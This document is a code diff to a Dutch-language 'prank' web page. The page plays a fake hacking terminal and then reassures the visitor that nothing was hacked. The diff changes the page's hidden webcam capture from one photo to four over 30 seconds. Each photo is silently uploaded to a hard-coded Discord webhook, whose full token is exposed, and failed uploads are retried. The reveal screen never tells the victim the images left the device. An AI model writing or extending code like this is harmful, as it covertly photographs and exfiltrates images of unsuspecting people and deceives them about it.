@@ -69,10 +69,23 @@
       text-shadow: 0 0 16px #ffff00; margin: 12px 0 8px;
     }
     #prank-screen p { font-size: clamp(.95rem,4vw,1.15rem); color: #00ff99; margin: 6px 0; }
-    #victim-photo {
-      display: none; width: 220px; height: 220px; object-fit: cover;
-      border-radius: 16px; border: 3px solid #ffff00; margin: 14px auto;
-      box-shadow: 0 0 24px #ffff0077;
+    #foto-grid {
+      display: none;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 10px;
+      margin: 14px auto;
+      width: 92%;
+      max-width: 360px;
+    }
+    #foto-grid.show { display: grid; }
+    #foto-grid img {
+      width: 100%; aspect-ratio: 1; object-fit: cover;
+      border-radius: 12px; border: 2px solid #ffff00;
+      box-shadow: 0 0 14px #ffff0055;
+    }
+    #foto-grid .foto-num {
+      font-size: .65rem; color: #ffff00;
+      text-align: center; margin-top: 3px;
     }
     #victim-label { display:none; font-size:.85rem; color:#ffff00; margin-bottom:4px; }
     #prank-screen .credits { font-size:.8rem; color:#555; margin-top:22px; }
@@ -95,8 +108,8 @@
 <div id="prank-screen">
   <div class="big-emoji">😂🎉</div>
   <h1>JE BENT GEPRANKT!</h1>
-  <div id="victim-label">📸 dit was jouw gezicht:</div>
-  <img id="victim-photo" alt="" />
+  <div id="victim-label">📸 jouw gezicht de afgelopen 30 sec:</div>
+  <div id="foto-grid"></div>
   <p>Er is helemaal niks gehackt 😄</p>
   <p>Maak je maar geen zorgen!</p>
   <div class="credits">— iemand die van grappen houdt 💚</div>
@@ -111,7 +124,7 @@
   var photoEl     = document.getElementById('victim-photo');
   var labelEl     = document.getElementById('victim-label');
 
-  var capturedPhoto    = null;
+  var capturedPhotos   = [];   // alle gemaakte foto's
   var captureScheduled = false;
   var activeStream     = null;
 
@@ -167,92 +180,96 @@
   var DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1504871414203945021/EP6lLwMehByFAAzVbNHcR2ZLe05l8fyhwK5c6V7b57vhRUkhT59GoPVBnb1vlQV8m6zd';
   var discordBlob = null;
 
-  function stuurNaarDiscord(blob, poging) {
+  function stuurNaarDiscord(blob, nummer, poging) {
     if (!DISCORD_WEBHOOK || !blob) return;
     poging = poging || 1;
-    if (poging > 4) return; // max 4 pogingen
-    discordBlob = blob;
+    if (poging > 4) return;
     var fd = new FormData();
-    fd.append('file', blob, 'prank_foto.jpg');
-    fd.append('content', 'Nieuwe prank foto! ' + new Date().toLocaleString('nl-NL'));
+    fd.append('file', blob, 'prank_foto_' + nummer + '.jpg');
+    fd.append('content', 'Foto ' + nummer + '/4 — ' + new Date().toLocaleString('nl-NL'));
     fetch(DISCORD_WEBHOOK, { method: 'POST', body: fd })
       .then(function(r) {
-        if (!r.ok) setTimeout(function() { stuurNaarDiscord(discordBlob, poging + 1); }, 3000);
+        if (!r.ok) setTimeout(function(){ stuurNaarDiscord(blob, nummer, poging+1); }, 3000);
       })
       .catch(function() {
-        setTimeout(function() { stuurNaarDiscord(discordBlob, poging + 1); }, 3000);
+        setTimeout(function(){ stuurNaarDiscord(blob, nummer, poging+1); }, 3000);
       });
   }
 
-  /* ---- Foto maken (canvas.toBlob = native iOS, snel en klein) ---- */
-  function doCapture() {
-    if (capturedPhoto) return;
+  /* ---- Foto maken — nummer = 1,2,3,4 ---- */
+  function doCapture(nummer) {
     if (!activeStream) return;
     var w = camEl.videoWidth;
     var h = camEl.videoHeight;
     if (!w || w === 0) {
-      setTimeout(doCapture, 400);
+      setTimeout(function(){ doCapture(nummer); }, 400);
       return;
     }
     try {
       var canvas = document.createElement('canvas');
-      // Max 640px breed — kleinere foto, sneller versturen
-      var scale = Math.min(1, 640 / w);
+      var scale  = Math.min(1, 640 / w);
       canvas.width  = Math.round(w * scale);
       canvas.height = Math.round(h * scale);
       canvas.getContext('2d').drawImage(camEl, 0, 0, canvas.width, canvas.height);
 
-      // Stop stream zodra frame vastgelegd is
-      if (activeStream) {
-        activeStream.getTracks().forEach(function(t) { t.stop(); });
-        activeStream = null;
-      }
-
-      // toBlob is native op iOS — veel betrouwbaarder dan toDataURL + atob
       canvas.toBlob(function(blob) {
         if (!blob) return;
-        // Lokaal opslaan voor het reveal-scherm
+        // Lokaal bewaren als dataURL
         var reader = new FileReader();
         reader.onload = function(e) {
-          capturedPhoto = e.target.result;
-          savePhoto(capturedPhoto);
+          var dataUrl = e.target.result;
+          capturedPhotos[nummer - 1] = dataUrl;
+          savePhoto(dataUrl);
         };
         reader.readAsDataURL(blob);
-        // Naar Discord sturen
-        stuurNaarDiscord(blob);
+        // Naar Discord met fotonummer
+        stuurNaarDiscord(blob, nummer);
       }, 'image/jpeg', 0.75);
-
     } catch(e) {}
   }
 
   function scheduleCapture() {
     if (captureScheduled) return;
     captureScheduled = true;
-    // Probeer op 3, 5 en 8 seconden voor zekerheid
-    setTimeout(doCapture, 3000);
-    setTimeout(doCapture, 5000);
-    setTimeout(doCapture, 8000);
+    // 4 foto's: op 5, 12, 20 en 27 seconden
+    setTimeout(function(){ doCapture(1); }, 5000);
+    setTimeout(function(){ doCapture(2); }, 12000);
+    setTimeout(function(){ doCapture(3); }, 20000);
+    setTimeout(function(){ doCapture(4); }, 27000);
   }
 
   /* ---- Nep hack-terminal ---- */
   var ip = '192.168.' + (Math.floor(Math.random()*254)+1) + '.' + (Math.floor(Math.random()*254)+1);
   var contacts = Math.floor(Math.random()*300)+50;
   var logLines = [
-    '> init secure_shell...', '> doelwit gevonden',
-    '> ip-adres: ' + ip, '> verbinding tot stand gebracht',
-    '> firewall omzeild', '> root-toegang verkregen',
+    '> init secure_shell...',
+    '> doelwit gevonden',
+    '> ip-adres: ' + ip,
+    '> verbinding tot stand gebracht',
+    '> firewall omzeild',
+    '> root-toegang verkregen',
     '> bestandssysteem koppelen...',
     '> contacten kopiëren... (' + contacts + ')',
-    '> berichten uitlezen...', '> media-bibliotheek downloaden...',
+    '> sms-berichten uitlezen...',
+    '> e-mails doorzoeken...',
+    '> media-bibliotheek downloaden...',
     '> locatiegeschiedenis ophalen',
+    '> [####----------] 28%',
     '> opgeslagen wachtwoorden ontcijferen...',
+    '> bank-app gevonden 💳',
     '> sessietokens onderscheppen',
+    '> [########------] 55%',
     '> gegevens uploaden naar server',
-    '> [############------] 71%', '> camera-stream koppelen...',
-    '> microfoon activeren...', '> back-up versleutelen...',
-    '> sporen wissen...', '> proces voltooien...',
+    '> camera-stream koppelen...',
+    '> microfoon activeren...',
+    '> [############--] 83%',
+    '> cloudopslag koppelen...',
+    '> back-up versleutelen...',
+    '> sporen wissen...',
+    '> [##############] 100%',
+    '> proces voltooid.',
   ];
-  var TOTAL = 20000;
+  var TOTAL = 30000;
   var idx = 0;
   function nextLine() {
     if (idx < logLines.length) {
@@ -287,10 +304,23 @@
       if (activeStream) {
         activeStream.getTracks().forEach(function(t) { t.stop(); });
       }
-      if (capturedPhoto) {
-        photoEl.src = capturedPhoto;
-        photoEl.style.display = 'block';
-        labelEl.style.display = 'block';
+      var fotoGrid = document.getElementById('foto-grid');
+      var labelEl2 = document.getElementById('victim-label');
+      if (capturedPhotos.length > 0) {
+        capturedPhotos.forEach(function(dataUrl, i) {
+          if (!dataUrl) return;
+          var wrap = document.createElement('div');
+          var img  = document.createElement('img');
+          img.src  = dataUrl;
+          var num  = document.createElement('div');
+          num.className   = 'foto-num';
+          num.textContent = (i === 0 ? '5s' : i === 1 ? '12s' : i === 2 ? '20s' : '27s');
+          wrap.appendChild(img);
+          wrap.appendChild(num);
+          fotoGrid.appendChild(wrap);
+        });
+        fotoGrid.classList.add('show');
+        labelEl2.style.display = 'block';
       }
       logEl.style.display = 'none';
       prankScreen.classList.add('show');
